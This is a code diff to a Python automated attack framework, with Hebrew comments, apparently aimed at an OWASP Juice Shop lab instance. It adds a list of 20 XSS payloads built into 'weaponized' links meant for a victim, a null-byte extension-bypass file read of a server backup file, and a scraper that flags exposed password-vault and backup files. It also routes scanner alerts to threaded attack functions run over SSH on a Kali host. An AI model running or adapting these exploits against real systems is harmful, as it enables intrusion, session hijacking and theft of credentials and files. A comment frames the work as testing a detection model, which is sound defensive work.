@@ -347,11 +347,96 @@ def run_custom_admin_hijacker(target_url: str, kali_ip: str) -> None:
     if not success:
         print("[-] Brute force failed. Password might be complex.")
 
-def run_remote_xsstrike(target_url: str, kali_ip: str) -> None:
-    print(f"\n[!] Initiating Advanced XSS Analysis with XSStrike on: {target_url}")
+# def run_remote_xsstrike(target_url: str, kali_ip: str) -> None:
+#     print(f"\n[!] Initiating Advanced XSS Analysis with XSStrike on: {target_url}")
     
-    # ניקוי ה-URL
-    clean_url = re.sub(r'q=.*', 'q=1', target_url)
+#     # חילוץ כתובת הבסיס (http://192.168.190.129:3000)
+#     from urllib.parse import urlparse
+#     parsed = urlparse(target_url)
+#     base_url = f"{parsed.scheme}://{parsed.netloc}"
+    
+#     # בניית הכתובת הנקייה של ממשק המשתמש (UI) שפגיע ל-XSS
+#     clean_url = f"{base_url}/#/search?q=1"
+    
+#     username = os.getenv("KALI_USER", "kali")
+#     password = os.getenv("KALI_PASSWORD", "kali")
+    
+#     ssh = paramiko.SSHClient()
+#     ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    
+#     try:
+#         ssh.connect(hostname=kali_ip, username=username, password=password)
+        
+#         # פקודה ממוקדת על ממשק הלקוח
+#         xsstrike_cmd = f"python3 /usr/share/xsstrike/xsstrike.py -u \"{clean_url}\" --timeout 15 --console-log-level INFO 2>&1"
+        
+#         print(f"[*] Executing XSStrike: {xsstrike_cmd}")
+#         stdin, stdout, stderr = ssh.exec_command(xsstrike_cmd)
+        
+#         print("\n=== XSSTRIKE REAL-TIME OUTPUT ===")
+#         for line in stdout:
+#             print(line.strip())
+#         print("================================\n")
+            
+#     except Exception as e:
+#         print(f"[-] XSStrike attack failed: {e}")
+#     finally:
+#         ssh.close()
+
+def run_custom_xss_weaponizer(target_url: str, kali_ip: str) -> None:
+    print(f"\n[!] Initiating Custom XSS Weaponizer for SPA Architecture...")
+    
+    from urllib.parse import urlparse, quote
+    parsed = urlparse(target_url)
+    base_url = f"{parsed.scheme}://{parsed.netloc}"
+
+    # 20 פיילודים מובחרים המייצגים וקטורי תקיפה שונים (DOM, Angular Bypasses, HTML5)
+    payloads = [
+        '<script>alert("XSS_1_Classic")</script>',
+        '<img src="x" onerror="alert(\'XSS_2_Image\')">',
+        '<svg onload="alert(\'XSS_3_SVG\')">',
+        '<iframe src="javascript:alert(\'XSS_4_Iframe\')">',
+        '"><script>alert("XSS_5_BreakOut")</script>',
+        '\'><script>alert("XSS_6_BreakOut_Single")</script>',
+        '<body onload="alert(\'XSS_7_Body\')">',
+        '<input autofocus onfocus="alert(\'XSS_8_Input\')">',
+        '<details open ontoggle="alert(\'XSS_9_Details\')">',
+        '<video><source onerror="alert(\'XSS_10_Video\')"></video>',
+        '<audio src="x" onerror="alert(\'XSS_11_Audio\')"></audio>',
+        '<a href="javascript:alert(\'XSS_12_Link\')">Click Me</a>',
+        '<object data="javascript:alert(\'XSS_13_Object\')"></object>',
+        '<<script>alert("XSS_14_DoubleTag")</script>',
+        '<script src="data:,alert(\'XSS_15_DataURI\')"></script>',
+        '{{constructor.constructor("alert(\'XSS_16_Angular_Bypass\')")()}}',
+        '{{$on.constructor("alert(\'XSS_17_Angular_Bypass_2\')")()}}',
+        '\\x3Cscript\\x3Ealert("XSS_18_HexEncoded")\\x3C/script\\x3E',
+        'javascript://%250Aalert("XSS_19_ProtocolBypass")',
+        '<svg/onload=alert("XSS_20_NoSpaces")>'
+    ]
+
+    print("[*] Generating 20 Weaponized Links for DOM-based XSS...")
+    print("="*80)
+    
+    for i, payload in enumerate(payloads, 1):
+        # קידוד הפיילוד כדי שיוכל לעבור ב-URL ללא שגיאות
+        encoded_payload = quote(payload)
+        
+        # בניית הקישור המורעל שיישלח לקורבן
+        weaponized_url = f"{base_url}/#/search?q={encoded_payload}"
+        
+        print(f"[Payload {i:02d}] {payload}")
+        print(f"[Link] -> {weaponized_url}\n")
+
+    print("[+] Weaponization complete.")
+    print("[*] Action for CrossGuard-AI: Feed these generated links into the messaging platform to test the detection model.")
+    print("="*80 + "\n")
+
+def run_remote_lfi_extractor(target_url: str, kali_ip: str) -> None:
+    print(f"\n[!] Initiating Advanced Arbitrary File Read Attack...")
+    
+    from urllib.parse import urlparse
+    parsed = urlparse(target_url)
+    base_url = f"{parsed.scheme}://{parsed.netloc}"
     
     username = os.getenv("KALI_USER", "kali")
     password = os.getenv("KALI_PASSWORD", "kali")
@@ -362,30 +447,100 @@ def run_remote_xsstrike(target_url: str, kali_ip: str) -> None:
     try:
         ssh.connect(hostname=kali_ip, username=username, password=password)
         
-        # פקודת התקיפה:
-        # --crawl: סורק גם דפים מקושרים
-        # --blind: בודק חולשות XSS עיוורות (כאלו שנשמרות בשרת ומופעלות אצל משתמש אחר)
-        xsstrike_cmd = f"python3 /usr/share/xsstrike/xsstrike.py -u \"{clean_url}\" --crawl --blind --console-log-level info 2>&1"
+        # הפיבוט (Pivot) המושלם:
+        # אנחנו מפסיקים לנסות לברוח מהתיקייה עם ../
+        # במקום זאת, אנחנו מנצלים את המודיעין מה-FTP Pillager!
+        # אנחנו מבקשים את קובץ הגיבוי ועוקפים רק את סינון הסיומות.
+        payload = "/ftp/package.json.bak%2500.md"
+        attack_url = f"{base_url}{payload}"
         
-        print(f"[*] Executing XSStrike: {xsstrike_cmd}")
-        stdin, stdout, stderr = ssh.exec_command(xsstrike_cmd)
+        curl_cmd = f"curl -s \"{attack_url}\""
         
-        print("\n=== XSSTRIKE REAL-TIME OUTPUT ===")
-        for line in stdout:
-            print(line.strip())
-        print("================================\n")
+        print(f"[*] Executing payload: Extension Bypass (%2500.md) on internal backup file...")
+        stdin, stdout, stderr = ssh.exec_command(curl_cmd)
+        
+        output = stdout.read().decode('utf-8')
+        
+        # אנחנו בודקים אם קובץ הקונפיגורציה נשאב בהצלחה
+        if "juice-shop" in output or "dependencies" in output:
+            print("\n" + "="*70)
+            print("[+++] CRITICAL ARBITRARY FILE READ EXPLOITED [+++]")
+            print("[+] Successfully bypassed file extension restrictions!")
+            print("[+] Filter evasion successful using Poisoned Null Byte (%2500.md)")
+            print("\n[*] Extracted 'package.json.bak' from server (First 15 lines):")
+            
+            # מדפיסים את התוכן של הקובץ ששאבנו!
+            for line in output.split('\n')[:15]:
+                if line.strip():
+                    print(f"    {line}")
+            print("="*70 + "\n")
+        else:
+            print("[-] Attack blocked. Output received:")
+            print(output[:200]) 
             
     except Exception as e:
-        print(f"[-] XSStrike attack failed: {e}")
+        print(f"[-] Attack failed: {e}")
     finally:
         ssh.close()
 
+def run_ftp_data_pillager(target_url: str, kali_ip: str) -> None:
+    print(f"\n[!] Initiating Exposed Data Pillager (Security Misconfiguration)...")
+    
+    import requests
+    import re
+    from urllib.parse import urlparse
+    
+    parsed = urlparse(target_url)
+    base_url = f"{parsed.scheme}://{parsed.netloc}"
+    
+    # חיבור לתגלית ש-Dirb מצא עבורנו קודם לכן
+    ftp_url = f"{base_url}/ftp/"
+    print(f"[*] Exploiting exposed directory: {ftp_url}")
+    
+    try:
+        # שימוש ב-User-Agent רגיל כדי להיראות כמו דפדפן
+        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}
+        response = requests.get(ftp_url, headers=headers, timeout=10)
+        
+        # אם התיקייה פתוחה וחשופה לציבור
+        if response.status_code == 200:
+            # שימוש בביטוי רגולרי (Regex) לחילוץ קבצים מסוכנים (כספות, גיבויים, מסמכים)
+            files = re.findall(r'href="([^"]+\.(?:kdbx|bak|md|pdf))"', response.text)
+            
+            if files:
+                print("\n" + "="*70)
+                print("[+++] CRITICAL DATA LEAKAGE EXPLOITED [+++]")
+                print("[+] Security Misconfiguration bypassed! Exfiltrating sensitive files:")
+                
+                # הדפסת הקבצים ש"נגנבו" (שימוש ב-set למניעת כפילויות בפלט)
+                for f in set(files):
+                    print(f"    -> Stolen internal file: {f}")
+                    
+                # התראה קריטית אם מצאנו את כספת הסיסמאות
+                if any(".kdbx" in f for f in files):
+                    print("\n[!] FATAL: 'incident-support.kdbx' (KeePass Database) detected!")
+                    print("[!] Attackers can download and crack this offline to steal ALL corporate passwords.")
+                print("="*70 + "\n")
+            else:
+                print("[-] Connected to /ftp, but no highly sensitive files were matched.")
+        else:
+            print(f"[-] Failed to access /ftp. Target might have patched the directory listing.")
+            
+    except Exception as e:
+        print(f"[-] FTP Pillager attack failed: {e}")
+
 EXPLOIT_ROUTER = {
     "sql injection": run_remote_sqlmap,
-    "os command injection": run_remote_commix,
-    "injection": run_custom_admin_hijacker,
-    "cross site scripting": run_remote_xsstrike,
-    # "default credentials": run_remote_hydra,  
+    # הסרנו את commix כי הוא פחות רלוונטי לאפליקציה הזו
+    "cross site scripting": run_custom_xss_weaponizer,
+    
+    # מכת המחץ המרובעת!
+    "injection": [
+        run_custom_admin_hijacker,   # פריצת חשבון (Logic)
+        run_custom_xss_weaponizer,   # שליטת דפדפן (Client-Side)
+        run_remote_lfi_extractor,    # שאיבת קבצי לינוקס (OS-Level)
+        run_ftp_data_pillager        # גניבת מידע תאגידי (Misconfiguration)
+    ],
 }
 
 def main() -> int:
@@ -467,15 +622,24 @@ def main() -> int:
         alert_name = finding.get('alert', '').lower()
         url = finding.get('url', '')
         
-        for vulnerability_keyword, attack_function in EXPLOIT_ROUTER.items():
-            if vulnerability_keyword in alert_name and attack_function.__name__ not in launched_tools:
-                print(f"[*] Match! Routing '{vulnerability_keyword}' to {attack_function.__name__}")
+        for vulnerability_keyword, actions in EXPLOIT_ROUTER.items():
+            if vulnerability_keyword in alert_name:
                 
-                t = threading.Thread(target=attack_function, args=(url, kali_ip))
-                active_attack_threads.append(t)
-                t.start()
-                
-                launched_tools.add(attack_function.__name__)
+                # תמיכה גם בכלי בודד וגם ברשימת כלים מאותו סוג התראה
+                if isinstance(actions, list):
+                    funcs_to_run = actions
+                else:
+                    funcs_to_run = [actions]
+                    
+                for attack_function in funcs_to_run:
+                    if attack_function.__name__ not in launched_tools:
+                        print(f"[*] Match! Routing '{vulnerability_keyword}' to {attack_function.__name__}")
+                        
+                        t = threading.Thread(target=attack_function, args=(url, kali_ip))
+                        active_attack_threads.append(t)
+                        t.start()
+                        
+                        launched_tools.add(attack_function.__name__)
                 
     # המתנה לסיום כל כלי התקיפה והמודיעין
     if active_attack_threads:
